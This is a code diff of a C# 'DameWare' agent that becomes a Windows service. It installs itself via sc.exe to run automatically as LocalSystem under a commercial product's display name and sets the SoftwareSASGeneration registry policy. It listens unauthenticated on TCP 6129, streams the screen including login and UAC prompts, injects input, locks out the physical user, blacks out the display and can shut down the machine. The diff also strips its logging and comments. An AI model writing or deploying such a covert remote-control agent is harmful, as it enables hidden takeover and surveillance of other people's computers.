@@ -9,18 +9,20 @@ using System.Threading;
 using System.Windows.Forms;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
+using System.ServiceProcess;
 using Microsoft.Win32;
 
 namespace DameWareNativeAgent
 {
-    class Program
+    public class DameWareService : ServiceBase
     {
+        public const string SERVICE_NAME = "DameWareAgentService";
         private static int PORT = 6129;
         private static bool isRunning = true;
         private static bool isInputLocked = false;
         private static bool isScreenBlackedOut = false;
+        private static TcpListener listener;
 
-        // WIN32 DESKTOP SWITCHING API (CAPTURES WINLOGON, LOCK SCREEN & UAC PROMPTS)
         [DllImport("user32.dll", SetLastError = true)]
         public static extern IntPtr OpenInputDesktop(uint dwFlags, bool fInherit, uint dwDesiredAccess);
 
@@ -45,30 +47,15 @@ namespace DameWareNativeAgent
         [DllImport("user32.dll", SetLastError = true)]
         public static extern bool BlockInput(bool fBlockIt);
 
-        // WINDOWS SAS (CTRL+ALT+DEL) API
         [DllImport("sas.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
         public static extern void SendSAS(bool AsUser);
 
-        // ACCESS RIGHTS FOR OPENINPUTDESKTOP
-        public const uint DESKTOP_CREATEMENU = 0x0004;
-        public const uint DESKTOP_CREATEWINDOW = 0x0002;
-        public const uint DESKTOP_ENUMERATE = 0x0040;
-        public const uint DESKTOP_HOOKCONTROL = 0x0008;
-        public const uint DESKTOP_JOURNALRECORD = 0x0010;
-        public const uint DESKTOP_JOURNALPLAYBACK = 0x0020;
-        public const uint DESKTOP_READOBJECTS = 0x0001;
-        public const uint DESKTOP_SWITCHDESKTOP = 0x0100;
-        public const uint DESKTOP_WRITEOBJECTS = 0x0080;
         public const uint GENERIC_ALL = 0x10000000;
-
-        // MOUSE CONSTANTS
-        public const uint MOUSEEVENTF_MOVE = 0x0001;
         public const uint MOUSEEVENTF_LEFTDOWN = 0x0002;
         public const uint MOUSEEVENTF_LEFTUP = 0x0004;
         public const uint MOUSEEVENTF_RIGHTDOWN = 0x0008;
         public const uint MOUSEEVENTF_RIGHTUP = 0x0010;
 
-        // KEYBOARD CONSTANTS
         public const byte VK_CONTROL = 0x11;
         public const byte VK_MENU = 0x12;
         public const byte VK_DELETE = 0x2E;
@@ -78,40 +65,119 @@ namespace DameWareNativeAgent
         public const byte VK_L = 0x4C;
         public const uint KEYEVENTF_KEYUP = 0x0002;
 
-        static void Main(string[] args)
+        public DameWareService()
         {
-            Console.Title = "DameWare Agent Service v12.2 (Winlogon, UAC & SAS Enabled)";
-            Console.ForegroundColor = ConsoleColor.Cyan;
-            Console.WriteLine("==========================================================");
-            Console.WriteLine(" DameWare Agent Service - Lock Screen, UAC & SAS Active");
-            Console.WriteLine("==========================================================");
+            this.ServiceName = SERVICE_NAME;
+        }
 
-            // Enable Software SAS Generation in Windows Registry (Required for Ctrl+Alt+Del)
+        protected override void OnStart(string[] args)
+        {
+            StartServer();
+        }
+
+        protected override void OnStop()
+        {
+            isRunning = false;
+            try { if (listener != null) listener.Stop(); } catch {}
+        }
+
+        public static void Main(string[] args)
+        {
+            if (args.Length > 0 && args[0].ToLower() == "-install")
+            {
+                InstallService();
+                return;
+            }
+            if (args.Length > 0 && args[0].ToLower() == "-uninstall")
+            {
+                UninstallService();
+                return;
+            }
+
+            if (!Environment.UserInteractive)
+            {
+                ServiceBase.Run(new DameWareService());
+            }
+            else
+            {
+                Console.Title = "DameWare Mini Remote Control Agent v12.2 (SYSTEM Service & Winlogon)";
+                Console.ForegroundColor = ConsoleColor.Cyan;
+                Console.WriteLine("==========================================================");
+                Console.WriteLine(" DameWare Agent Service - Winlogon & UAC Capture");
+                Console.WriteLine("==========================================================");
+                Console.WriteLine("To install as permanent SYSTEM Windows Service, run:");
+                Console.WriteLine("  DameWare_Agent.exe -install");
+                Console.WriteLine("==========================================================");
+                Console.ResetColor();
+
+                DameWareService service = new DameWareService();
+                service.StartServer();
+
+                Console.WriteLine("Press ENTER to stop agent...");
+                Console.ReadLine();
+            }
+        }
+
+        private static void RunCommandWait(string cmd, string args)
+        {
+            try {
+                Process p = Process.Start(cmd, args);
+                if (p != null) p.WaitForExit();
+            } catch {}
+        }
+
+        private static void InstallService()
+        {
+            try {
+                string exePath = Process.GetCurrentProcess().MainModule.FileName;
+                Console.WriteLine("Installing DameWare Agent as SYSTEM Service...");
+
+                EnableSoftwareSASRegistry();
+
+                RunCommandWait("sc.exe", string.Format("stop {0}", SERVICE_NAME));
+                RunCommandWait("sc.exe", string.Format("delete {0}", SERVICE_NAME));
+                RunCommandWait("sc.exe", string.Format("create {0} binPath= \"{1}\" start= auto obj= LocalSystem displayName= \"DameWare Mini Remote Control Agent v12.2\"", SERVICE_NAME, exePath));
+                RunCommandWait("sc.exe", string.Format("start {0}", SERVICE_NAME));
+
+                Console.ForegroundColor = ConsoleColor.Green;
+                Console.WriteLine("[+] Service successfully installed and started as SYSTEM!");
+                Console.ResetColor();
+            } catch (Exception ex) {
+                Console.WriteLine("[-] Install failed: " + ex.Message);
+            }
+        }
+
+        private static void UninstallService()
+        {
+            try {
+                RunCommandWait("sc.exe", string.Format("stop {0}", SERVICE_NAME));
+                RunCommandWait("sc.exe", string.Format("delete {0}", SERVICE_NAME));
+                Console.WriteLine("[+] Service uninstalled.");
+            } catch {}
+        }
+
+        private void StartServer()
+        {
             EnableSoftwareSASRegistry();
 
-            // Background Physical Input Lock Enforcer
             Thread blockEnforcer = new Thread(EnforcePhysicalInputLock);
             blockEnforcer.IsBackground = true;
             blockEnforcer.Start();
 
-            TcpListener listener = new TcpListener(IPAddress.Any, PORT);
-            try {
-                listener.Start();
-                Console.ForegroundColor = ConsoleColor.Green;
-                Console.WriteLine(string.Format("[+] Agent Active & Listening on TCP Port {0}", PORT));
-                Console.WriteLine(string.Format("[+] Computer Name: {0}", Environment.MachineName));
-                Console.WriteLine(string.Format("[+] User Account: {0}", Environment.UserName));
-                Console.ResetColor();
+            ThreadPool.QueueUserWorkItem((o) => {
+                try {
+                    listener = new TcpListener(IPAddress.Any, PORT);
+                    listener.Start();
+                    Console.WriteLine(string.Format("[+] DameWare Service listening on TCP Port {0}", PORT));
 
-                while (isRunning) {
-                    TcpClient client = listener.AcceptTcpClient();
-                    Console.WriteLine(string.Format("[*] Console connected from: {0}", client.Client.RemoteEndPoint));
-                    ThreadPool.QueueUserWorkItem(HandleClient, client);
+                    while (isRunning) {
+                        TcpClient client = listener.AcceptTcpClient();
+                        ThreadPool.QueueUserWorkItem(HandleClient, client);
+                    }
+                } catch (Exception ex) {
+                    Console.WriteLine("[-] Error: " + ex.Message);
                 }
-            } catch (Exception ex) {
-                Console.ForegroundColor = ConsoleColor.Red;
-                Console.WriteLine(string.Format("[-] Error starting agent: {0}", ex.Message));
-            }
+            });
         }
 
         private static void EnableSoftwareSASRegistry()
@@ -120,12 +186,9 @@ namespace DameWareNativeAgent
                 using (RegistryKey key = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")) {
                     if (key != null) {
                         key.SetValue("SoftwareSASGeneration", 3, RegistryValueKind.DWord);
-                        Console.WriteLine("[+] Windows SoftwareSASGeneration Policy set to 3 (Services & Apps SAS Enabled).");
                     }
                 }
-            } catch (Exception ex) {
-                Console.WriteLine("[-] Registry SAS Policy Notice: " + ex.Message);
-            }
+            } catch {}
         }
 
         private static void EnforcePhysicalInputLock()
@@ -145,12 +208,10 @@ namespace DameWareNativeAgent
             TcpClient client = (TcpClient)obj;
             NetworkStream stream = client.GetStream();
 
-            // Send Handshake
             string handshake = string.Format("{{\"type\":\"HANDSHAKE_ACK\",\"agentVersion\":\"DameWare Native v12.2\",\"hostname\":\"{0}\",\"user\":\"{1}\",\"os\":\"Windows {2}\"}}\n", Environment.MachineName, Environment.UserName, Environment.OSVersion);
             byte[] handshakeBytes = Encoding.UTF8.GetBytes(handshake);
             stream.Write(handshakeBytes, 0, handshakeBytes.Length);
 
-            // Frame Streaming Thread (20 FPS) with Winlogon & UAC Input Desktop Switcher
             Thread streamThread = new Thread(() => {
                 try {
                     while (client.Connected) {
@@ -159,21 +220,20 @@ namespace DameWareNativeAgent
                             byte[] blackBytes = Encoding.UTF8.GetBytes(blackFrame);
                             stream.Write(blackBytes, 0, blackBytes.Length);
                         } else {
-                            string frameBase64 = CaptureInputDesktopJpegBase64();
+                            string frameBase64 = CaptureActiveDesktopJpegBase64();
                             if (!string.IsNullOrEmpty(frameBase64)) {
                                 string packet = string.Format("{{\"type\":\"SCREEN_FRAME\",\"frame\":\"{0}\",\"timestamp\":{1},\"width\":1920,\"height\":1080}}\n", frameBase64, DateTime.Now.Ticks);
                                 byte[] packetBytes = Encoding.UTF8.GetBytes(packet);
                                 stream.Write(packetBytes, 0, packetBytes.Length);
                             }
                         }
-                        Thread.Sleep(50); // 20 FPS
+                        Thread.Sleep(50);
                     }
                 } catch {}
             });
             streamThread.IsBackground = true;
             streamThread.Start();
 
-            // Command Processing Loop
             byte[] buffer = new byte[16384];
             try {
                 int bytesRead;
@@ -188,15 +248,13 @@ namespace DameWareNativeAgent
                 }
             } catch {}
 
-            Console.WriteLine("[-] Console disconnected.");
             client.Close();
         }
 
         private static void ProcessCommand(string cmd)
         {
             try {
-                // Attach thread to active desktop (Winlogon, SecureDesktop, Default)
-                SwitchThreadToInputDesktop();
+                SwitchToInputDesktop();
 
                 if (cmd.Contains("MOUSE_INPUT")) {
                     double xPercent = GetJsonDouble(cmd, "xPercent");
@@ -229,13 +287,8 @@ namespace DameWareNativeAgent
                 else if (cmd.Contains("KEYBOARD_INPUT")) {
                     string key = GetJsonString(cmd, "key");
 
-                    // 1. REAL WINDOWS SAS (CTRL + ALT + DEL)
                     if (key == "CAD") {
-                        Console.WriteLine("[*] Executing Windows SAS (Ctrl+Alt+Del)...");
-                        try {
-                            SendSAS(false);
-                        } catch {
-                            // Fallback simulation
+                        try { SendSAS(false); } catch {
                             keybd_event(VK_CONTROL, 0, 0, 0);
                             keybd_event(VK_MENU, 0, 0, 0);
                             keybd_event(VK_DELETE, 0, 0, 0);
@@ -246,9 +299,7 @@ namespace DameWareNativeAgent
                         }
                     }
                     else if (key == "WIN_L") {
-                        ThreadPool.QueueUserWorkItem((o) => {
-                            try { LockWorkStation(); } catch {}
-                        });
+                        ThreadPool.QueueUserWorkItem((o) => { try { LockWorkStation(); } catch {} });
                     }
                     else if (key == "WIN_TAB" || key == "ALT_TAB") {
                         if (key == "WIN_TAB") {
@@ -292,13 +343,10 @@ namespace DameWareNativeAgent
                     else if (action == "shutdown") Process.Start("shutdown.exe", "/s /t 5 /c \"DameWare Remote Shutdown\"");
                     else if (action == "logoff") Process.Start("logoff.exe");
                 }
-            } catch (Exception ex) {
-                Console.WriteLine("[-] Command error: " + ex.Message);
-            }
+            } catch {}
         }
 
-        // DYNAMIC DESKTOP SWITCHER (SWITCHES THREAD TO WINLOGON / UAC / DEFAULT DESKTOP)
-        private static void SwitchThreadToInputDesktop()
+        private static void SwitchToInputDesktop()
         {
             try {
                 IntPtr hDesktop = OpenInputDesktop(0, false, GENERIC_ALL);
@@ -309,12 +357,10 @@ namespace DameWareNativeAgent
             } catch {}
         }
 
-        private static string CaptureInputDesktopJpegBase64()
+        private static string CaptureActiveDesktopJpegBase64()
         {
             try {
-                // Switch thread context to active Winlogon/UAC/Default Desktop
-                SwitchThreadToInputDesktop();
-
+                SwitchToInputDesktop();
                 Rectangle bounds = Screen.PrimaryScreen.Bounds;
                 using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height)) {
                     using (Graphics g = Graphics.FromImage(bitmap)) {
@@ -333,9 +379,7 @@ namespace DameWareNativeAgent
         private static string EscapeSendKeys(string key)
         {
             if (key == "+" || key == "^" || key == "%" || key == "~" || key == "(" || key == ")" || key == "{" || key == "}" || key == "[" || key == "]")
-            {
                 return "{" + key + "}";
-            }
             return key;
         }
 
